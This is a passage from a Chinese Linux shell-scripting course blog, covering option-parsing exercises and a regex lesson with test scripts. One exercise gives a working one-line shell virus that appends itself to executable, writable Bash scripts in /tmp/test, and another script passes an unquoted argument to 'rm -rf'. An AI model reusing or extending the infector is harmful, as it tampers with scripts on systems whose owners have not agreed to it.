class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#### 课堂练习</span></span><br><span class="line"></span><br><span class="line">5. 创建一个命令booboo，命令用法如下：</span><br><span class="line">booboo -t 30s 代表睡30s；即-t后跟时间</span><br><span class="line">booboo -l /tmp  代表显示某个目录下面的内容和属性以及目录本身的属性</span><br><span class="line">booboo -r /tmp/file 代表删除某个文件</span><br><span class="line">booboo --<span class="built_in">help</span>代表帮助信息显示该命令的用法</span><br><span class="line"></span><br><span class="line">6. 输入你的出生日期，程序会告诉你距离你下一个生日还有几天？</span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">[root@client0 ~]<span class="comment"># cat booboo</span></span><br><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">sleep <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIR ()</span><br><span class="line">&#123;</span><br><span class="line">ls -l <span class="variable">$1</span></span><br><span class="line">ls -ld <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">RM ()</span><br><span class="line">&#123;</span><br><span class="line">rm -rf <span class="variable">$1</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">case</span> <span class="variable">$1</span> <span class="keyword">in</span></span><br><span class="line">-t)</span><br><span class="line">SLEEP <span class="variable">$2</span>;;</span><br><span class="line">-l)</span><br><span class="line">DIR <span class="variable">$2</span>;;</span><br><span class="line">-r)</span><br><span class="line">RM <span class="variable">$2</span>;;</span><br><span class="line">--<span class="built_in">help</span>)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line">*)</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"Usage: ls [-t|-l|-r|--help] [values]"</span>;;</span><br><span class="line"><span class="keyword">esac</span></span><br><span class="line">[root@client0 ~]<span class="comment"># ./booboo -t 3s</span></span><br></pre></td></tr></table></figure><hr><p>使用bash写一个脚本实现以下功能：</p><p>1) -r 查看系统发行版本<br>2) -k 查看系统内核版本<br>3) -d 查看系统磁盘信息<br>4) -u 查看当前系统用户<br>5) -t 查看系统运行时间<br>6) -s 查看selinux状态<br>7) -f 查看内存信息<br>8) -n 查看网络信息<br>9) -a 实现以上所有功能<br>10）–help 查看帮助</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">REL () &#123;</span><br><span class="line">cat /etc/redhat-release</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">KER () &#123;</span><br><span class="line">uname -a</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">DIS () &#123;</span><br><span class="line">df -h</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">USR () &#123;</span><br><span class="line">who</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">UPT () &#123;</span><br><span class="line">uptime</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">SEL () &#123;</span><br><span class="line">getenforce</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">FER () &#123;</span><br><span class="line">free -m</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">NET () &#123;</span><br><span class="line">ifconfig</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-r)</span><br><span class="line">REL;;</span><br><span class="line">-k)</span><br><span class="line">KER;;</span><br><span class="line">-d)</span><br><span class="line">DIS;;</span><br><span class="line">-u)</span><br><span class="line">USR;;</span><br><span class="line">-t)</span><br><span class="line">UPT;;</span><br><span class="line">-s)</span><br><span class="line">SEL;;</span><br><span class="line">-f)</span><br><span class="line">FER;;</span><br><span class="line">-n)</span><br><span class="line">NET;;</span><br><span class="line">-a)</span><br><span class="line">REL;KER;DIS;USR;UPT;SEL;FER;NET;;</span><br><span class="line">--help)</span><br><span class="line">echo "this is help"</span><br><span class="line">esac</span><br></pre></td></tr></table></figure><hr><p>用shell脚本写一个病毒，要求如下：</p><ol><li>可以感染系统中的所有Bourne-Again shell script的脚本,可执行，可写；</li><li>执行感染后的bash shell脚本会输出”echo hello,I am evil!”</li><li>如果已经被感染，就不再感染</li></ol><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [ ! -f /tmp/.mybblock ];then touch /tmp/.mybblock; for i in `find /tmp/test/*` ; do grep "mybblock" $i &amp;&gt; /dev/null &amp;&amp; continue ; file $i | grep "Bourne-Again shell script" &amp;&gt; /dev/null || continue ; [ -x $i -a -w $i ] || continue ; tail -n 1 $0 &gt;&gt; $i; done ; echo "hello,I am evil!"; rm -rf /tmp/.mybblock &amp;&gt; /dev/null ; fi</span><br></pre></td></tr></table></figure><hr><p>如果foo.sh 的第一个位置参数为-s ，那么就沉睡，时间由第二个位置参数决定</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">SLEEP ()</span><br><span class="line">&#123;</span><br><span class="line">        echo "now sleep"</span><br><span class="line">        sleep $1</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">case $1 in</span><br><span class="line">-s)</span><br><span class="line">        SLEEP $2;;</span><br><span class="line">*)</span><br><span class="line">        exit;;</span><br><span class="line">esac</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;ol&gt;
&lt;li&gt;&lt;p&gt;shell 的基本组成元素&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;1&amp;gt; 魔法字符 “ #! ”: 出现在脚本第一行 , 用于定义命令解释器。&lt;/li&gt;
&lt;li&gt;2&amp;gt; “ # ” 号开头的行 : 除了第一行的魔法字符以外 , 其他以 ” # “ 号开头 的行
      
    
    </summary>
    
    
      <category term="技术培训" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本教程" scheme="http://www.toberoot.com/categories/%E6%8A%80%E6%9C%AF%E5%9F%B9%E8%AE%AD/LinuxShell%E8%84%9A%E6%9C%AC%E6%95%99%E7%A8%8B/"/>
    
    
      <category term="培训" scheme="http://www.toberoot.com/tags/%E5%9F%B9%E8%AE%AD/"/>
    
      <category term="LinuxShell脚本" scheme="http://www.toberoot.com/tags/LinuxShell%E8%84%9A%E6%9C%AC/"/>
    
  </entry>
  
  <entry>
    <title>LINUX Shell Scripts 第三课:正则表达式</title>
    <link href="http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/"/>
    <id>http://www.toberoot.com/2016/12/23/booboo_bash_shell_scripts/02_shell_regular_expression/</id>
    <published>2016-12-22T21:06:27.000Z</published>
    <updated>2020-03-24T05:17:54.751Z</updated>
    
    <content type="html"><![CDATA[<p>Regular Expression 、 regex 或 regexp, 缩写为 RE 正则表达式这个概念最初是由 Unix 中的工具软件 ( 例如 sed 和 grep) 普及开的。</p><p>通常被用来检索、替换那些符合某个规则的文本。</p><p>许多程序设计语言都支持正则表达是进行字符串操作。例如，在perl中就内建了一个功能强大的正则表达式引擎，还有java语言自带的。</p><p>起源于科学家对人类神经系统工作原理的早期研究；Ken Thompson将其应用到计算搜索算法 ，Unix之父将此引入到编辑器QED，后来的ed，最终引入grep。</p><p>概念：</p><p>正则表达式是对字符串操作的一种逻辑公式，就是用事先定义好的一些特定字符、以及这些特定字符的组合，组成一个“规则字符串”，这个“规则字符串”用来表达对字符串的一种过滤逻辑。</p><h3 id="什么是正则表达式"><a href="#什么是正则表达式" class="headerlink" title="什么是正则表达式"></a>什么是正则表达式</h3><ul><li>正则表达式就是记录文本规则的代码</li><li>和通配符类似,正则表达式也是用来进行文本匹配的工具,只不过比起通配符,它能更精确地描述你的需求</li></ul><p>字符和字符串：</p><ul><li>字符是计算机软件处理文字时最基本的单位,可能是字母,数字,标点符号,空格,换行符,汉字等等</li><li>字符串是0个或更多个字符的序列。</li></ul><p>特点：</p><ol><li>灵活性、逻辑性和功能性非常强；</li><li>可以迅速地用极简单的方式达到字符串的复杂控制；</li><li>对于刚接触的人来说，比较晦涩难懂。</li></ol><p>应用程序：<br>grep,egrep,awk,mysql,vim</p><h3 id="特殊符号"><a href="#特殊符号" class="headerlink" title="特殊符号"></a>特殊符号</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">特殊字符 代表意义</span><br><span class="line">[:alnum:] 代表英文大小写字符及数字 ,0-9, A-Z, a-z</span><br><span class="line">[:alpha:] 代表任何英文大小写字符 , A-Z, a-z</span><br><span class="line">[:lower:] 代表小写字符 , a-z</span><br><span class="line">[:upper:] 代表大写字符 ,A-Z</span><br><span class="line">[:digit:] 代表数字而已 , 0-9</span><br><span class="line">[:xdigit:] 代表 16 进制数字 , 因此包括 : 0-9, A-F, a-f</span><br><span class="line">[:blank:] 代表空格键和 [Tab] 按键</span><br><span class="line">[:space:] 任何会产生空白的字符,包括空格键 , [Tab], CR 等等</span><br><span class="line">[:graph:] 除了空格键 ( 空格键和 [Tab] ) 外的其他所有按键</span><br><span class="line">[:cntrl:] 代表键盘上面的控制按键 , 包括 CR, LF, Tab, Del.. 等等</span><br><span class="line">[:print:] 代表任何可以被打印出来的字符</span><br><span class="line">[:punct:] 代表标点符号 (punctuation symbol) :&quot; &#39; ? ! ; : # $...</span><br></pre></td></tr></table></figure><h3 id="非打印字符"><a href="#非打印字符" class="headerlink" title="非打印字符"></a>非打印字符</h3><p>非打印字符也可以是正则表达式的组成部分。下表列出了表示非打印字符的转义序列：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">字符 描述</span><br><span class="line">\cx 匹配由x指明的控制字符。例如， \cM 匹配一个 Control-M 或回车符。x 的值必须为 A-Z 或 a-z 之一。否则，将 c 视为一个原义的 &#39;c&#39; 字符。</span><br><span class="line">\f 匹配一个换页符。等价于 \x0c 和 \cL。</span><br><span class="line">\n 匹配一个换行符。等价于 \x0a 和 \cJ。</span><br><span class="line">\r 匹配一个回车符。等价于 \x0d 和 \cM。</span><br><span class="line">\s 匹配任何空白字符，包括空格、制表符、换页符等等。等价于 [ \f\n\r\t\v]。</span><br><span class="line">\S 匹配任何非空白字符。等价于 [^ \f\n\r\t\v]。</span><br><span class="line">\t 匹配一个制表符。等价于 \x09 和 \cI。</span><br><span class="line">\v 匹配一个垂直制表符。等价于 \x0b 和 \cK</span><br></pre></td></tr></table></figure><h3 id="常见的正则表达式"><a href="#常见的正则表达式" class="headerlink" title="常见的正则表达式"></a>常见的正则表达式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">^ 行首定位符</span><br><span class="line">$ 行尾定位符</span><br><span class="line">. 匹配除换行符之外的单个字符</span><br><span class="line">* 匹配 0 个或多个前一字符</span><br><span class="line">? 匹配 0 个或1个前一字符</span><br><span class="line">+匹配 1 个或多个前一个字符</span><br><span class="line">[ ] 匹配指定字符组内的任一字符</span><br><span class="line">[^] 匹配不在指定字符组内的任一字符</span><br><span class="line">\&lt; 单词起始边界匹配符</span><br><span class="line">\&gt; 单词结束边界匹配符</span><br><span class="line">x\&#123;m\&#125;连续 M 个字符 X</span><br><span class="line">x\&#123;m,\&#125; 至少 M 个字符 X</span><br><span class="line">x\&#123;m,n\&#125;至少 M 个最多 N 个字符 X</span><br></pre></td></tr></table></figure><h3 id="课堂练习"><a href="#课堂练习" class="headerlink" title="课堂练习"></a>课堂练习</h3><blockquote><p>写一个测试脚本re.sh;带位置参数执行，例如 re.sh ab</p></blockquote><h4 id="代表以a开头的"><a href="#代表以a开头的" class="headerlink" title="代表以a开头的"></a>代表以a开头的</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ^a  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="代表以a结尾的"><a href="#代表以a结尾的" class="headerlink" title="代表以a结尾的"></a>代表以a结尾的</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a$  ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ba</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="代表a字符后面一定有两个字符"><a href="#代表a字符后面一定有两个字符" class="headerlink" title="代表a字符后面一定有两个字符"></a>代表a字符后面一定有两个字符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a..  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh axx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh baxxx</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="代表匹配a字符后面可以是0个b，也可以是多个b"><a href="#代表匹配a字符后面可以是0个b，也可以是多个b" class="headerlink" title="代表匹配a字符后面可以是0个b，也可以是多个b"></a>代表匹配a字符后面可以是0个b，也可以是多个b</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab*  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbbxxx</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="匹配-0-个或1个前一字符"><a href="#匹配-0-个或1个前一字符" class="headerlink" title="匹配 0 个或1个前一字符"></a>匹配 0 个或1个前一字符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ 1a?1 ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh 11</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1a1</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1aa1</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="代表匹配a字符后面可以是1个b，也可以是多个b"><a href="#代表匹配a字符后面可以是1个b，也可以是多个b" class="headerlink" title="代表匹配a字符后面可以是1个b，也可以是多个b"></a>代表匹配a字符后面可以是1个b，也可以是多个b</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab+ ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh ac</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="代表匹配ab字符，后面可以是任意字符"><a href="#代表匹配ab字符，后面可以是任意字符" class="headerlink" title="代表匹配ab字符，后面可以是任意字符"></a>代表匹配ab字符，后面可以是任意字符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ ab.*  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# vim re.sh</span><br><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh abbbb</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh accc</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ccc</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="代表匹配a和b字符之间可以是任意字符"><a href="#代表匹配a和b字符之间可以是任意字符" class="headerlink" title="代表匹配a和b字符之间可以是任意字符"></a>代表匹配a和b字符之间可以是任意字符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ a.*b  ]]</span><br><span class="line">then</span><br><span class="line">echo ok</span><br><span class="line">else</span><br><span class="line">echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh a</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh b</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh ab</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh a1b</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh 1a1b1</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符"><a href="#代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符" class="headerlink" title="代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符"></a>代表匹配指定字符组内的任一字符，可以用逗号分割，或者不用，效果一样都代表匹配一个字符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">ok</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">no</span><br></pre></td></tr></table></figure><h4 id="代表匹配不在指定字符组内的任一字符"><a href="#代表匹配不在指定字符组内的任一字符" class="headerlink" title="代表匹配不在指定字符组内的任一字符"></a>代表匹配不在指定字符组内的任一字符</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></span><br><span class="line">if [[ $1 =~ [^Bb]ooboo ]]</span><br><span class="line">then</span><br><span class="line">        echo ok</span><br><span class="line">else</span><br><span class="line">        echo no</span><br><span class="line">fi</span><br></pre></td></tr></table></figure><p><strong>测试：</strong></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">[root@rhel6 ~]# bash re.sh booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh Booboo</span><br><span class="line">no</span><br><span class="line">[root@rhel6 ~]# bash re.sh cooboo</span><br><span class="line">ok</span><br></pre></td></tr></table></figure><h4 id="单词起始和结束边界匹配符与行首行尾的匹配对比"><a href="#单词起始和结束边界匹配符与行首行尾的匹配对比" class="headerlink" title="单词起始和结束边界匹配符与行首行尾的匹配对比"></a>单词起始和结束边界匹配符与行首行尾的匹配对比</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span 